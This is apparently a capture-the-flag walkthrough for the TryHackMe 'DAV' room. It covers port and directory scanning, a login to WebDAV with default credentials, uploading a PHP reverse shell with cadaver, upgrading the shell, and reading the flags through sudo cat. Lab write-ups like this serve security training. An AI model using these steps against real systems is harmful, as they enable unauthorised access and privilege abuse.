# DAV-THM-CTF
DAV THM CTF Walkthrough

Solving DAV TryHackMe Capture The Flag
https://tryhackme.com/r/room/bsidesgtdav

First Step is reconnaissance.

nmap -sV -sC -Pn -A 10.10.210.35
*Img*

Here We only port 80 (http) is open running Apache httpd 2.4.18 on Ubuntu.

So, Next step We will be going to the webpage where We see default Apache page nothing really intersting yet.
*Img*

Now going for a ffuf search since (gobuster alternative).
ffuf -u http://10.10.210.35/FUZZ -e .php,.txt -w  /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt

Here, We got We got /webdav which is interesting.
Using BurpSuite or Hydra and such tools is not required for this login.
Since after some Googling I got to know, WebDAV stands for "Web-based Distributed Authoring and Versioning" which means it can be exploited.
Default credentials of WebDAV are used in this CTF Room wampp:xampp

Successful login.
*Img*

We get password.dav which has a hash which I couldn't crack. 

So, I searched for other vulnerabilities and found We can simply use cadaver to get acces to the same and upload a reverse shell php file.

cadaver http://10.10.210.35:80/webdav/
put reverseShell.php
*Img*

We can get the reverse shell php from the official pentestmonkey. Just modify your attacker ip and port
Link: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Open netcat listener.
*Img*

Let's go back to http://10.10.210.35/webdav/ and run the php file We just uploaded.
*Img*

We got the reverse shell.

Let's convert it into TTY Shell for easy use (Optional but recommended).
python3 -c 'import pty;pty.spawn("/bin/bash")'
*Img*

Now let's find user and root flags.
We can search each directory but I'm pretty lazy for that here's the shortcut which always works.

For the user.txt,
find / -type f -name user.txt 2>>/dev/null
*Img*
Now, simply do cat command to get the flag.

sudo -l to check what can be done for root flag.
*Img*

We can run cat command as sudo, couldn't be better.
sudo cat /root/root.txt
*Img*

Congrats! We have solved DAV THM CTF!
Follow My GitHub for more.
